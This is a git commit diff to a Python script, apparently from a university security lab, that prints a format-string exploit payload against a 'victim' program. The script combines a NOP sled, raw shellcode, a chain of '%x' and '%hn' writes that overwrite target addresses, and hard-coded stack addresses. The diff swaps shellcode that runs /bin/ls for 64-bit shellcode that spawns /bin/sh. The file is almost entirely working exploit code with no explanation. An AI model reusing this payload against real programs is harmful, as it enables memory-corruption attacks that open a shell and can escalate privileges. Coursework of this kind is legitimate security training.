3700245c291a9da693a964a8043c99dde54a7fc1
Stephen Dean <kdt298@my.utsa.edu>
2022-10-24 18:52:48 -0500

    fsdf

--- victim30/goldenstring.py
+++ victim30/goldenstring.py
@@ -1,8 +1,8 @@
 import sys
 import os
-NOPSLED = b'\x90' * 0xC
-SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
-
+NOPSLED = b'\x90' * 0xA
+SHELLCODE  = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
+SHELLCODE2 = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
 
 
 ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
@@ -39,5 +39,5 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(NOPSLED + SHELLCODE + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10106' + b'x' + b'%hn' + b'%' + b'32768x' + b'%hn' + b'%' + b'32769x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
+    stdout.write(NOPSLED + SHELLCODE2 + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10106' + b'x' + b'%hn' + b'%' + b'32768x' + b'%hn' + b'%' + b'32769x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
     #b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
